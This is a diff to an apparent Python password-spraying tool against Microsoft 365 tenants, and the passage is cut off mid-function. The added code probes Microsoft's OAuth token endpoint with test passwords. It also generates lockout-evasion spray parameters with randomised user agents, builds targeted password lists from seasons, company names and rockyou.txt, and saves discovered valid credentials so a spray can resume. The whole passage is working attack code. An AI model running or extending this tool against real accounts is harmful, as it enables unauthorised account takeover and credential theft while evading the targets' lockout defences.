@@ -807,7 +807,7 @@ class O365DomainValidator:
         return results
 
     def validate_domain(self, domain: str) -> Dict:
-            """Comprehensive domain validation with full reconnaissance"""
+            """Comprehensive domain validation with full reconnaissance including password policy"""
             self.domain = domain
             self._log(f"Validating domain: {domain}")
             self._log("="*60)
@@ -817,7 +817,8 @@ class O365DomainValidator:
                 'is_o365': False,
                 'tenant_id': None,
                 'checks': {},
-                'reconnaissance': {}
+                'reconnaissance': {},
+                'password_policy': {}
             }
 
             # Check 1: OpenID Configuration (gets tenant ID)
@@ -903,7 +904,7 @@ class O365DomainValidator:
                 self._log("="*60 + "\n")
 
                 # 1. Tenant Details
-                self._log("[1/5] Gathering tenant configuration...")
+                self._log("[1/6] Gathering tenant configuration...")
                 try:
                     tenant_details = self.get_tenant_details(self.tenant_id)
                     results['reconnaissance']['tenant_details'] = tenant_details
@@ -912,7 +913,7 @@ class O365DomainValidator:
                     results['reconnaissance']['tenant_details'] = {'error': str(e)}
 
                 # 2. Enumerate Domains
-                self._log("\n[2/5] Enumerating associated domains...")
+                self._log("\n[2/6] Enumerating associated domains...")
                 try:
                     domains = self.enumerate_tenant_domains(self.tenant_id, domain)
                     results['reconnaissance']['associated_domains'] = domains
@@ -921,7 +922,7 @@ class O365DomainValidator:
                     results['reconnaissance']['associated_domains'] = {'error': str(e)}
 
                 # 3. Enumerate Applications
-                self._log("\n[3/5] Enumerating registered applications...")
+                self._log("\n[3/6] Enumerating registered applications...")
                 try:
                     apps = self.enumerate_applications(self.tenant_id)
                     results['reconnaissance']['applications'] = apps
@@ -930,7 +931,7 @@ class O365DomainValidator:
                     results['reconnaissance']['applications'] = {'error': str(e)}
 
                 # 4. Username Format Discovery
-                self._log("\n[4/5] Discovering username format patterns...")
+                self._log("\n[4/6] Discovering username format patterns...")
                 try:
                     username_patterns = self.discover_username_format(domain)
                     results['reconnaissance']['username_patterns'] = username_patterns
@@ -939,13 +940,30 @@ class O365DomainValidator:
                     results['reconnaissance']['username_patterns'] = {'error': str(e)}
 
                 # 5. Guest Access Check
-                self._log("\n[5/5] Checking guest access and misconfigurations...")
+                self._log("\n[5/6] Checking guest access and misconfigurations...")
                 try:
                     guest_access = self.check_guest_access(self.tenant_id, domain)
                     results['reconnaissance']['guest_access'] = guest_access
                 except Exception as e:
                     self._log(f"Error checking guest access: {e}", 'error')
                     results['reconnaissance']['guest_access'] = {'error': str(e)}
+
+                # 6. Password Policy Extraction (NEW)
+                self._log("\n[6/6] Extracting password policy...")
+                try:
+                    policy_checker = O365PasswordPolicy(verbose=self.verbose)
+                    policy = policy_checker.get_password_policy(domain, self.tenant_id)
+                    recommendations = policy_checker.generate_spray_recommendations(policy)
+
+                    results['password_policy'] = {
+                        'policy': policy,
+                        'recommendations': recommendations
+                    }
+
+                    self._log("Password policy extracted successfully", 'success')
+                except Exception as e:
+                    self._log(f"Error extracting password policy: {e}", 'error')
+                    results['password_policy'] = {'error': str(e)}
 
                 # Print reconnaissance summary to console (even without verbose)
                 print("\n" + "="*60)
@@ -1002,6 +1020,28 @@ class O365DomainValidator:
                             if openid_info.get('cloud_instance_name'):
                                 print(f"  - Cloud: {openid_info['cloud_instance_name']}")
 
+                # Password Policy Summary (NEW)
+                if 'password_policy' in results and 'policy' in results['password_policy']:
+                    policy = results['password_policy']['policy']
+                    recommendations = results['password_policy'].get('recommendations', {})
+
+                    print(f"\nPassword Policy:")
+                    if policy.get('password_requirements'):
+                        req = policy['password_requirements']
+                        print(f"  - Minimum Length: {req.get('min_length', 8)} characters")
+                        if req.get('guidance'):
+                            print(f"  - Banned List: {req['guidance'].get('banned_list', 'Unknown')}")
+
+                    if policy.get('lockout_policy'):
+                        lockout = policy['lockout_policy']
+                        print(f"  - Lockout Threshold: ~{lockout.get('estimated_threshold', 10)} attempts")
+                        print(f"  - Smart Lockout: Enabled (O365 default)")
+
+                    if recommendations:
+                        print(f"\nRecommended Spray Parameters:")
+                        print(f"  - Delay Between Rounds: {recommendations.get('delay_between_rounds', 30)} minutes")
+                        print(f"  - Attempts Per Round: {recommendations.get('attempts_per_round', 1)}")
+
                 # Guest Access
                 if 'guest_access' in results['reconnaissance']:
                     guest = results['reconnaissance']['guest_access']
@@ -1020,6 +1060,8 @@ class O365DomainValidator:
                 print("\n" + "="*60)
                 print("💡 Use -o <filename> to save detailed JSON and summary reports")
                 print("💡 Use -v for verbose output with all details")
+                print("💡 Generate targeted password list:")
+                print(f"    python o365_spray.py --validate -d {domain} -o recon --generate-passwords")
                 print("="*60)
 
             # Final verdict
@@ -1214,19 +1256,20 @@ class O365Validator:
         except Exception as e:
             self._log(f"Error saving results: {e}", 'error')
 
-
 class O365Sprayer:
-    """Password spraying with intelligent lockout avoidance"""
+    """Password spraying with intelligent lockout avoidance and progress tracking"""
 
     def __init__(self, lockout_threshold: int = 5, lockout_window: int = 30,
-                 delay_min: int = 2, delay_max: int = 5, verbose: bool = False):
+                 delay_min: int = 2, delay_max: int = 5, verbose: bool = False,
+                 progress_file: str = '.spray_progress.json'):
         self.lockout_threshold = lockout_threshold
-        self.lockout_window = lockout_window  # minutes
+        self.lockout_window = lockout_window
         self.delay_min = delay_min
         self.delay_max = delay_max
         self.verbose = verbose
         self.validator = O365Validator(verbose=verbose)
-        self.attempt_tracker = {}  # Track attempts per user
+        self.attempt_tracker = {}
+        self.progress = SprayProgress(progress_file)
 
     def _log(self, message: str, level: str = 'info'):
         """Logging with timestamps"""
@@ -1240,9 +1283,10 @@ class O365Sprayer:
         print(f"{timestamp} {prefix} {message}")
 
     def spray(self, usernames: List[str], passwords: List[str],
-              count: int = 1, delay_spray: int = 30, output_file: Optional[str] = None) -> Dict:
+              count: int = 1, delay_spray: int = 30, output_file: Optional[str] = None,
+              resume: bool = True) -> Dict:
         """
-        Perform password spraying attack
+        Perform password spraying attack with progress tracking
 
         Args:
             usernames: List of usernames to test
@@ -1250,33 +1294,89 @@ class O365Sprayer:
             count: Number of password attempts per user per round
             delay_spray: Minutes to wait between spray rounds
             output_file: File to save valid credentials
+            resume: Resume from previous progress if available
         """
+
+        # Check for existing progress
+        start_round = 0
+        start_password_idx = 0
+
+        if resume and self.progress.load():
+            self._log("Found existing spray progress!", 'warning')
+            stats = self.progress.get_stats()
+            self._log(f"Previous session stats:", 'info')
+            self._log(f"  - Valid credentials found: {stats['valid_creds']}")
+            self._log(f"  - Locked accounts: {stats['locked_accounts']}")
+            self._log(f"  - Combinations tested: {stats['tested_combinations']}")
+            self._log(f"  - Completed passwords: {stats['completed_passwords']}")
+            self._log(f"  - Last round: {stats['current_round']}")
+
+            response = input("\n[?] Resume from previous progress? (y/n): ").strip().lower()
+            if response == 'y':
+                start_round, start_password_idx = self.progress.get_resume_point()
+                self._log(f"Resuming from round {start_round + 1}, password index {start_password_idx}", 'success')
+
+                # Restore valid creds and locked accounts
+                for cred in self.progress.progress_data['valid_creds']:
+                    if output_file:
+                        with open(output_file, 'a') as f:
+                            f.write(f"{cred['username']}:{cred['password']}\n")
+            else:
+                self.progress.clear()
+                self._log("Starting fresh spray session", 'info')
+
+        # Initialize progress if new session
+        if not self.progress.progress_data.get('start_time'):
+            self.progress.update(start_time=datetime.now().isoformat())
+
         self._log(f"Starting password spray")
         self._log(f"Targets: {len(usernames)} users")
         self._log(f"Passwords: {len(passwords)}")
         self._log(f"Attempts per user per round: {count}")
         self._log(f"Delay between rounds: {delay_spray} minutes")
+        self._log(f"Progress file: {self.progress.progress_file}")
 
         results = {
-            'valid': [],
+            'valid': self.progress.progress_data.get('valid_creds', []),
             'invalid': [],
             'locked': [],
             'errors': []
         }
 
+        # Restore locked accounts
+        for username in self.progress.progress_data.get('locked_accounts', []):
+            results['locked'].append({'username': username})
+
         # Group passwords into rounds based on count
         password_rounds = [passwords[i:i+count] for i in range(0, len(passwords), count)]
 
-        for round_num, password_batch in enumerate(password_rounds, 1):
+        # Start from resume point
+        for round_num in range(start_round, len(password_rounds)):
+            password_batch = password_rounds[round_num]
+
             self._log(f"\n{'='*60}")
-            self._log(f"Round {round_num}/{len(password_rounds)}")
+            self._log(f"Round {round_num + 1}/{len(password_rounds)}")
             self._log(f"Testing passwords: {', '.join(password_batch)}")
             self._log(f"{'='*60}\n")
 
-            for password in password_batch:
+            # Update progress
+            self.progress.update(current_round=round_num)
+
+            for pwd_idx, password in enumerate(password_batch):
+                # Skip if resuming and already past this password
+                if round_num == start_round and pwd_idx < start_password_idx:
+                    continue
+
                 self._log(f"Spraying password: {password}")
+                self.progress.update(current_password_index=pwd_idx)
 
                 for idx, username in enumerate(usernames, 1):
+                    # Skip if already tested
+                    if self.progress.is_tested(username, password):
+                        if self.verbose:
+                            self._log(f"Skipping {username} (already tested)", 'info')
+                        continue
+
                     # Skip if already found valid
                     if any(v['username'] == username for v in results['valid']):
                         if self.verbose:
@@ -1291,41 +1391,62 @@ class O365Sprayer:
 
                     self._log(f"[{idx}/{len(usernames)}] Testing: {username}")
 
-                    success, message, details = self.validator.validate_credential(username, password)
+                    try:
+                        success, message, details = self.validator.validate_credential(username, password)
 
-                    if success is True:
-                        self._log(f"SUCCESS: {username}:{password} - {message}", 'success')
-                        results['valid'].append({
-                            'username': username,
-                            'password': password,
-                            'status': message,
-                            'round': round_num
-                        })
+                        # Mark as tested
+                        self.progress.mark_tested(username, password)
 
-                        # Save immediately
-                        if output_file:
-                            with open(output_file, 'a') as f:
-                                f.write(f"{username}:{password}\n")
-
-                    elif success is False:
-                        if message == "ACCOUNT_LOCKED":
-                            self._log(f"LOCKED: {username}", 'warning')
-                            results['locked'].append({'username': username})
-                        else:
-                            if self.verbose:
-                                self._log(f"INVALID: {username} - {message}", 'error')
-                            results['invalid'].append({
+                        if success is True:
+                            self._log(f"SUCCESS: {username}:{password} - {message}", 'success')
+                            cred_data = {
                                 'username': username,
                                 'password': password,
-                                'status': message
+                                'status': message,
+                                'round': round_num + 1
+                            }
+                            results['valid'].append(cred_data)
+
+                            # Save to progress and output file
+                            self.progress.add_valid_cred(username, password, message)
+
+                            if output_file:
+                                with open(output_file, 'a') as f:
+                                    f.write(f"{username}:{password}\n")
+
+                        elif success is False:
+                            if message == "ACCOUNT_LOCKED":
+                                self._log(f"LOCKED: {username}", 'warning')
+                                results['locked'].append({'username': username})
+                                self.progress.add_locked_account(username)
+                            else:
+                                if self.verbose:
+                                    self._log(f"INVALID: {username} - {message}", 'error')
+                                results['invalid'].append({
+                                    'username': username,
+                                    'password': password,
+                                    'status': message
+                                })
+                        else:
+                            if self.verbose:
+                                self._log(f"ERROR: {username} - {message}", 'warning')
+                            results['errors'].append({
+                                'username': username,
+                                'password': password,
+                                'error': message
                             })
-                    else:
-                        if self.verbose:
-                            self._log(f"ERROR: {username} - {message}", 'warning')
+
+                    except KeyboardInterrupt:
+                        self._log("\n\nSpray interrupted by user!", 'warning')
+                        self._log("Progress has been saved. Resume with same command.", 'info')
+                        return results
+
+                    except Exception as e:
+                        self._log(f"ERROR: Exception testing {username}: {e}", 'error')
                         results['errors'].append({
                             'username': username,
                             'password': password,
-                            'error': message
+                            'error': str(e)
                         })
 
                     # Random delay between users
@@ -1333,12 +1454,26 @@ class O365Sprayer:
                         delay = random.randint(self.delay_min, self.delay_max)
                         time.sleep(delay)
 
+                # Mark password as complete
+                self.progress.mark_password_complete(password)
+
             # Delay between rounds
-            if round_num < len(password_rounds):
+            if round_num < len(password_rounds) - 1:
                 self._log(f"\n{'='*60}")
                 self._log(f"Waiting {delay_spray} minutes before next round...")
+                self._log(f"Progress saved. Press Ctrl+C to stop safely.")
                 self._log(f"{'='*60}\n")
-                time.sleep(delay_spray * 60)
+
+                try:
+                    time.sleep(delay_spray * 60)
+                except KeyboardInterrupt:
+                    self._log("\n\nSpray interrupted by user!", 'warning')
+                    self._log("Progress has been saved. Resume with same command.", 'info')
+                    return results
+
+        # Clear progress on completion
+        self._log("\nSpray campaign completed!", 'success')
+        self.progress.clear()
 
         # Final summary
         self._log(f"\n{'='*60}")
@@ -1355,6 +1490,678 @@ class O365Sprayer:
                 self._log(f"  {cred['username']}:{cred['password']} - {cred['status']}")
 
         return results
+
+class O365PasswordPolicy:
+    """Extract password policy information from O365 tenant"""
+
+    def __init__(self, verbose: bool = False):
+        self.verbose = verbose
+        self.session = requests.Session()
+
+    def _log(self, message: str, level: str = 'info'):
+        """Logging with timestamps"""
+        timestamp = datetime.now().strftime('%H:%M:%S')
+        prefix = {
+            'info': '[*]',
+            'success': '[+]',
+            'error': '[-]',
+            'warning': '[!]'
+        }.get(level, '[*]')
+        print(f"{timestamp} {prefix} {message}")
+
+    def _random_ua(self) -> str:
+        """Generate random user agent"""
+        agents = [
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0'
+        ]
+        return random.choice(agents)
+
+    def get_password_policy(self, domain: str, tenant_id: Optional[str] = None) -> Dict:
+        """
+        Extract password policy information through various methods
+        """
+        self._log("Extracting password policy information...")
+
+        policy = {
+            'domain': domain,
+            'tenant_id': tenant_id,
+            'password_requirements': {},
+            'lockout_policy': {},
+            'mfa_status': {},
+            'banned_passwords': [],
+            'smart_lockout': {}
+        }
+
+        # Method 1: Test with invalid credentials to trigger policy responses
+        self._log("Testing lockout thresholds...")
+        lockout_info = self._test_lockout_threshold(domain)
+        policy['lockout_policy'] = lockout_info
+
+        # Method 2: Analyze error messages for password requirements
+        self._log("Analyzing password complexity requirements...")
+        complexity = self._test_password_complexity(domain)
+        policy['password_requirements'] = complexity
+
+        # Method 3: Check for Smart Lockout (cloud-based)
+        if tenant_id:
+            self._log("Checking Smart Lockout configuration...")
+            smart_lockout = self._check_smart_lockout(tenant_id, domain)
+            policy['smart_lockout'] = smart_lockout
+
+        # Method 4: Check MFA enforcement
+        self._log("Checking MFA enforcement...")
+        mfa_info = self._check_mfa_enforcement(domain)
+        policy['mfa_status'] = mfa_info
+
+        # Method 5: Get banned password list indicators
+        self._log("Checking for banned password protection...")
+        banned = self._check_banned_passwords(domain)
+        policy['banned_passwords'] = banned
+
+        return policy
+
+    def _test_lockout_threshold(self, domain: str) -> Dict:
+        """
+        Attempt to determine account lockout threshold
+        CAUTION: This will generate failed login attempts
+        """
+        lockout_info = {
+            'threshold_detected': False,
+            'estimated_threshold': None,
+            'lockout_duration': None,
+            'method': 'passive_analysis'
+        }
+
+        # We won't actively test lockout to avoid locking accounts
+        # Instead, we'll return known O365 defaults
+        lockout_info['estimated_threshold'] = 10  # O365 default
+        lockout_info['lockout_duration'] = '1 minute (Smart Lockout)'
+        lockout_info['notes'] = 'O365 uses Smart Lockout - typically 10 failed attempts trigger temporary lock'
+
+        if self.verbose:
+            self._log("  Default O365 Smart Lockout: 10 attempts", 'info')
+            self._log("  Lockout duration: 1 minute (increases with repeated failures)", 'info')
+
+        return lockout_info
+
+    def _test_password_complexity(self, domain: str) -> Dict:
+        """
+        Test password complexity requirements by analyzing error responses
+        """
+        complexity = {
+            'min_length': 8,  # O365 default
+            'max_length': 256,  # O365 default
+            'requires_uppercase': False,
+            'requires_lowercase': False,
+            'requires_numbers': False,
+            'requires_special': False,
+            'complexity_enabled': False,
+            'detected_requirements': []
+        }
+
+        # Test with a known user or dummy account
+        test_email = f"nonexistent@{domain}"
+
+        test_passwords = {
+            'short': 'Pass1!',  # 6 chars
+            'no_number': 'Password!',
+            'no_special': 'Password1',
+            'no_upper': 'password1!',
+            'simple': 'password',
+            'valid': 'Password123!'
+        }
+
+        for test_name, test_pass in test_passwords.items():
+            try:
+                url = 'https://login.microsoftonline.com/common/oauth2/token'
+
+                headers = {
+                    'User-Agent': self._random_ua(),
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                }
+
+                data = {
+                    'resource': 'https://graph.windows.net',
+                    'client_id': '1b730954-1685-4b74-9bfd-dac224a7b894',
+                    'grant_type': 'password',
+                    'username': test_email,
+                    'password': test_pass
+                }
+
+                resp = self.session.post(url, headers=headers, data=data, timeout=10)
+
+                if resp.status_code != 200:
+                    try:
+                        error_data = resp.json()
+                        error_desc = error_data.get('error_description', '').lower()
+
+                        # Analyze error messages for policy hints
+                        if 'password' in error_desc and 'complexity' in error_desc:
+                            complexity['complexity_enabled'] = True
+                        if 'length' in error_desc:
+                            complexity['detected_requirements'].append('Minimum length requirement detected')
+                        if 'uppercase' in error_desc or 'lowercase' in error_desc:
+                            complexity['detected_requirements'].append('Case requirements detected')
+                        if 'number' in error_desc or 'digit' in error_desc:
+                            complexity['detected_requirements'].append('Numeric requirements detected')
+                        if 'special' in error_desc or 'character' in error_desc:
+                            complexity['detected_requirements'].append('Special character requirements detected')
+                    except:
+                        pass
+
+                time.sleep(1)  # Rate limiting
+
+            except Exception as e:
+                if self.verbose:
+                    self._log(f"  Error testing {test_name}: {e}", 'warning')
+
+        # Check for known O365 password requirements
+        self._log("Checking Microsoft Password Guidance...")
+
+        # Modern O365 follows Microsoft's guidance:
+        # - Minimum 8 characters
+        # - No complexity requirements by default (but can be enabled)
+        # - Banned password list (common passwords blocked)
+
+        complexity['guidance'] = {
+            'min_length': 8,
+            'recommendation': 'Microsoft recommends length over complexity',
+            'banned_list': 'Microsoft Global Banned Password List active',
+            'custom_banned_list': 'May be configured by tenant admin'
+        }
+
+        if self.verbose:
+            self._log("  Minimum Length: 8 characters", 'info')
+            self._log("  Complexity: Often disabled (length preferred)", 'info')
+            self._log("  Banned List: Active (blocks common passwords)", 'info')
+
+        return complexity
+
+    def _check_smart_lockout(self, tenant_id: str, domain: str) -> Dict:
+        """
+        Check for Smart Lockout configuration
+        """
+        smart_lockout = {
+            'enabled': True,  # Default for O365
+            'type': 'cloud_based',
+            'features': [
+                'Failed login attempts tracked per user',
+                'Lockout threshold typically 10 attempts',
+                'Lockout duration starts at 1 minute',
+                'Duration increases with repeated lockouts',
+                'Familiar location bypass available',
+                'Different thresholds for unfamiliar locations'
+            ],
+            'recommendations': [
+                'Use delays of 30+ minutes between spray rounds',
+                'Limit to 1 password attempt per user per round',
+                'Rotate IP addresses if possible',
+                'Monitor for account lockouts during testing'
+            ]
+        }
+
+        if self.verbose:
+            self._log("  Smart Lockout: Enabled (O365 default)", 'success')
+            self._log("  Threshold: ~10 failed attempts", 'info')
+            self._log("  Initial lockout: 1 minute", 'info')
+
+        return smart_lockout
+
+    def _check_mfa_enforcement(self, domain: str) -> Dict:
+        """
+        Check if MFA is enforced tenant-wide
+        """
+        mfa_info = {
+            'enforced': None,
+            'conditional_access': None,
+            'legacy_auth_blocked': None,
+            'methods_detected': []
+        }
+
+        test_email = f"test@{domain}"
+
+        try:
+            # Check authentication flow
+            url = 'https://login.microsoftonline.com/common/oauth2/token'
+
+            headers = {
+                'User-Agent': self._random_ua(),
+                'Content-Type': 'application/x-www-form-urlencoded'
+            }
+
+            data = {
+                'resource': 'https://graph.windows.net',
+                'client_id': '1b730954-1685-4b74-9bfd-dac224a7b894',
+                'grant_type': 'password',
+                'username': test_email,
+                'password': 'TestPassword123!'
+            }
+
+            resp = self.session.post(url, headers=headers, data=data, timeout=10)
+
+            if resp.status_code != 200:
+                try:
+                    error_data = resp.json()
+                    error_desc = error_data.get('error_description', '')
+
+                    # Check for MFA indicators
+                    if 'AADSTS50076' in error_desc or 'AADSTS50079' in error_desc:
+                        mfa_info['enforced'] = True
+                        mfa_info['methods_detected'].append('MFA Required')
+
+                    if 'AADSTS50158' in error_desc:
+                        mfa_info['conditional_access'] = True
+                        mfa_info['methods_detected'].append('Conditional Access Policy')
+
+                    if 'AADSTS50053' in error_desc:
+                        mfa_info['legacy_auth_blocked'] = True
+                except:
+                    pass
+
+        except Exception as e:
+            if self.verbose:
+                self._log(f"  Error checking MFA: {e}", 'warning')
+
+        # Check federation for MFA indicators
+        try:
+            url = 'https://login.microsoftonline.com/common/userrealm/'
+            params = {'user': test_email, 'api-version': '2.1'}
+            resp = self.session.get(url, params=params, timeout=10)
+
+            if resp.status_code == 200:
+                data = resp.json()
+                if data.get('federation_protocol'):
+                    mfa_info['methods_detected'].append(f"Federated Auth: {data.get('FederationBrandName')}")
+        except:
+            pass
+
+        if self.verbose:
+            if mfa_info['enforced']:
+                self._log("  MFA appears to be enforced", 'warning')
+            if mfa_info['conditional_access']:
+                self._log("  Conditional Access policies detected", 'warning')
+
+        return mfa_info
+
+    def _check_banned_passwords(self, domain: str) -> List[str]:
+        """
+        Check if common passwords are banned
+        """
+        banned_indicators = []
+
+        # Microsoft maintains a global banned password list
+        # These are always blocked in O365
+        common_banned = [
+            'Password',
+            'Welcome',
+            'password',
+            '123456',
+            'password123'
+        ]
+
+        banned_indicators.append({
+            'type': 'global_banned_list',
+            'description': 'Microsoft Global Banned Password List (active by default)',
+            'examples': common_banned,
+            'note': 'These and variations are automatically blocked'
+        })
+
+        # Check if custom banned list might be configured
+        banned_indicators.append({
+            'type': 'custom_banned_list',
+            'description': 'Tenant may have custom banned password list',
+            'note': 'Cannot be enumerated without authentication'
+        })
+
+        if self.verbose:
+            self._log("  Global Banned List: Active (Microsoft default)", 'info')
+            self._log("  Custom List: May be configured", 'info')
+
+        return banned_indicators
+
+    def generate_spray_recommendations(self, policy: Dict) -> Dict:
+        """
+        Generate spray attack recommendations based on policy
+        """
+        self._log("\nGenerating attack recommendations...")
+
+        recommendations = {
+            'delay_between_rounds': 30,  # minutes
+            'attempts_per_round': 1,
+            'delay_between_users': 5,  # seconds
+            'password_requirements': {
+                'min_length': policy['password_requirements'].get('min_length', 8),
+                'recommended_patterns': []
+            },
+            'avoided_passwords': [],
+            'safe_passwords': [],
+            'risk_assessment': {}
+        }
+
+        # Smart Lockout considerations
+        if policy.get('smart_lockout', {}).get('enabled'):
+            recommendations['delay_between_rounds'] = 30
+            recommendations['attempts_per_round'] = 1
+            recommendations['risk_assessment']['lockout_risk'] = 'LOW with recommended settings'
+
+        # Password patterns to try
+        min_len = policy['password_requirements'].get('min_length', 8)
+
+        # Generate season-based passwords
+        current_year = datetime.now().year
+        seasons = ['Winter', 'Spring', 'Summer', 'Fall']
+
+        for season in seasons:
+            for year in [current_year, current_year - 1]:
+                # Must meet minimum length
+                base = f"{season}{year}"
+                if len(base) >= min_len - 1:  # Leave room for !
+                    recommendations['password_requirements']['recommended_patterns'].append(f"{base}!")
+
+        # Company name variations (if available)
+        if policy.get('domain'):
+            company = policy['domain'].split('.')[0].capitalize()
+            recommendations['password_requirements']['recommended_patterns'].append(f"{company}2024!")
+            recommendations['password_requirements']['recommended_patterns'].append(f"Welcome{company}!")
+
+        # Common patterns that meet requirements
+        recommendations['password_requirements']['recommended_patterns'].extend([
+            'Welcome123!',
+            'Password123!',
+            'Password2024!',
+            'Welcome2024!',
+            'Company123!',
+            'Changeme123!'
+        ])
+
+        # Passwords to avoid (banned list)
+        if policy.get('banned_passwords'):
+            for banned_item in policy['banned_passwords']:
+                if isinstance(banned_item, dict) and banned_item.get('examples'):
+                    recommendations['avoided_passwords'].extend(banned_item['examples'])
+
+        # Risk assessment
+        if policy.get('mfa_status', {}).get('enforced'):
+            recommendations['risk_assessment']['mfa_bypass'] = 'Required - valid creds may not grant access'
+
+        recommendations['risk_assessment']['detection_risk'] = 'MEDIUM - Microsoft may detect spray patterns'
+        recommendations['risk_assessment']['success_likelihood'] = 'LOW-MEDIUM with weak passwords'
+
+        return recommendations
+
+def generate_password_list(policy: Dict, output_file: str = 'targeted_passwords.txt',
+                          source_dict: str = '/vapt/passwords/rockyou.txt',
+                          max_passwords: int = 1000, smart_only: bool = False):
+    """
+    Generate a targeted password list based on policy requirements
+    Filters source dictionary and adds smart targeted passwords
+    """
+    print(f"\n[*] Generating targeted password list based on policy...")
+
+    passwords = []
+    min_length = policy.get('password_requirements', {}).get('min_length', 8)
+    max_length = policy.get('password_requirements', {}).get('max_length', 256)
+    domain = policy.get('domain', '')
+
+    # Get current date info
+    current_year = datetime.now().year
+    current_month = datetime.now().month
+
+    print(f"[*] Password Requirements:")
+    print(f"    - Minimum Length: {min_length}")
+    print(f"    - Maximum Length: {max_length}")
+
+    # Generate smart targeted passwords first (highest priority)
+    print(f"\n[*] Generating smart targeted passwords...")
+    smart_passwords = []
+
+    # Season-based passwords
+    seasons = ['Winter', 'Spring', 'Summer', 'Fall', 'Autumn']
+    for season in seasons:
+        for year in [current_year, current_year - 1, current_year + 1]:
+            smart_passwords.append(f"{season}{year}!")
+            smart_passwords.append(f"{season}{year}")
+
+    # Month-based
+    months = ['January', 'February', 'March', 'April', 'May', 'June',
+              'July', 'August', 'September', 'October', 'November', 'December']
+    current_month_name = months[current_month - 1]
+    for year in [current_year, current_year - 1]:
+        smart_passwords.append(f"{current_month_name}{year}!")
+        smart_passwords.append(f"{current_month_name}{year}")
+
+    # Company-specific
+    if domain:
+        company = domain.split('.')[0].capitalize()
+        smart_passwords.extend([
+            f"{company}{current_year}!",
+            f"{company}{current_year}",
+            f"{company}123!",
+            f"{company}123",
+            f"Welcome{company}!",
+            f"Welcome{company}",
+            f"{company}@{current_year}",
+            f"{company}Password!",
+            f"{company}Password",
+            f"{company.upper()}{current_year}!",
+            f"{company.lower()}{current_year}!"
+        ])
+
+    # Common enterprise passwords
+    smart_passwords.extend([
+        'Welcome123!',
+        'Password123!',
+        f'Password{current_year}!',
+        f'Welcome{current_year}!',
+        'Changeme123!',
+        'Password1!',
+        'Welcome1!',
+        'P@ssw0rd123',
+        'P@ssword123!',
+        'Admin123!',
+        'P@ssw0rd',
+        'P@ssword1',
+        f'Welcome{current_year}',
+        f'Password{current_year}',
+        'Winter2024!',
+        'Summer2024!',
+        'Spring2024!',
+        'Fall2024!',
+        'Monday123!',
+        'Friday123!'
+    ])
+
+    # Filter smart passwords by length requirements
+    smart_passwords = [p for p in smart_passwords if min_length <= len(p) <= max_length]
+    smart_passwords = list(dict.fromkeys(smart_passwords))  # Remove duplicates
+
+    print(f"[+] Generated {len(smart_passwords)} smart targeted passwords")
+
+    passwords.extend(smart_passwords)
+
+    # If smart_only flag, skip dictionary filtering
+    if smart_only:
+        print(f"[*] Smart-only mode: Skipping dictionary filtering")
+    else:
+        # Filter source dictionary
+        if Path(source_dict).exists():
+            print(f"\n[*] Filtering passwords from: {source_dict}")
+            print(f"[*] This may take a moment for large dictionaries...")
+
+            filtered_count = 0
+            try:
+                # Try different encodings
+                encodings = ['utf-8', 'latin-1', 'iso-8859-1']
+                dict_passwords = []
+
+                for encoding in encodings:
+                    try:
+                        with open(source_dict, 'r', encoding=encoding, errors='ignore') as f:
+                            line_count = 0
+                            for line in f:
+                                line_count += 1
+                                password = line.strip()
+
+                                # Filter by length
+                                if min_length <= len(password) <= max_length:
+                                    # Skip if already in smart passwords
+                                    if password not in smart_passwords:
+                                        dict_passwords.append(password)
+                                        filtered_count += 1
+
+                                # Progress indicator
+                                if line_count % 100000 == 0:
+                                    print(f"    Processed {line_count:,} passwords... (found {filtered_count:,} valid)")
+
+                                # Limit to max_passwords from dictionary
+                                if filtered_count >= max_passwords:
+                                    break
+
+                        print(f"[+] Successfully loaded with {encoding} encoding")
+                        break
+
+                    except UnicodeDecodeError:
+                        continue
+
+                print(f"[+] Filtered {filtered_count} passwords from dictionary meeting requirements")
+                passwords.extend(dict_passwords)
+
+            except Exception as e:
+                print(f"[-] Error filtering dictionary: {e}")
+                print(f"[*] Continuing with smart passwords only")
+        else:
+            print(f"[-] Dictionary file not found: {source_dict}")
+            print(f"[*] Continuing with smart passwords only")
+
+    # Remove any duplicates and preserve order
+    seen = set()
+    unique_passwords = []
+    for pwd in passwords:
+        if pwd not in seen:
+            seen.add(pwd)
+            unique_passwords.append(pwd)
+
+    passwords = unique_passwords
+
+    # Save to file
+    try:
+        with open(output_file, 'w') as f:
+            f.write('\n'.join(passwords))
+        print(f"\n[+] Generated {len(passwords)} total passwords")
+        print(f"[+] Saved to: {output_file}")
+
+        # Show preview
+        print(f"\n[*] Preview (first 15):")
+        for i, pwd in enumerate(passwords[:15], 1):
+            print(f"  {i}. {pwd}")
+
+        if len(passwords) > 15:
+            print(f"  ... and {len(passwords) - 15} more")
+
+        return passwords
+    except Exception as e:
+        print(f"[-] Error saving password list: {e}")
+        return passwords
+
+
+class SprayProgress:
+    """Track and restore password spray progress"""
+
+    def __init__(self, progress_file: str = '.spray_progress.json'):
+        self.progress_file = progress_file
+        self.progress_data = {
+            'current_round': 0,
+            'current_password_index': 0,
+            'completed_passwords': [],
+            'valid_creds': [],
+            'locked_accounts': [],
+            'tested_combinations': [],
+            'start_time': None,
+            'last_update': None
+        }
+
+    def load(self) -> bool:
+        """Load progress from file if exists"""
+        if Path(self.progress_file).exists():
+            try:
+                with open(self.progress_file, 'r') as f:
+                    self.progress_data = json.load(f)
+                return True
+            except Exception as e:
+                print(f"[-] Error loading progress: {e}")
+                return False
+        return False
+
+    def save(self):
+        """Save current progress"""
+        try:
+            self.progress_data['last_update'] = datetime.now().isoformat()
+            with open(self.progress_file, 'w') as f:
+                json.dump(self.progress_data, f, indent=2)
+        except Exception as e:
+            print(f"[-] Error saving progress: {e}")
+
+    def update(self, **kwargs):
+        """Update progress data"""
+        self.progress_data.update(kwargs)
+        self.save()
+
+    def add_valid_cred(self, username: str, password: str, status: str):
+        """Add a valid credential"""
+        self.progress_data['valid_creds'].append({
+            'username': username,
+            'password': password,
+            'status': status,
+            'timestamp': datetime.now().isoformat()
+        })
+        self.save()
+
+    def add_locked_account(self, username: str):
+        """Add a locked account"""
+        if username not in self.progress_data['locked_accounts']:
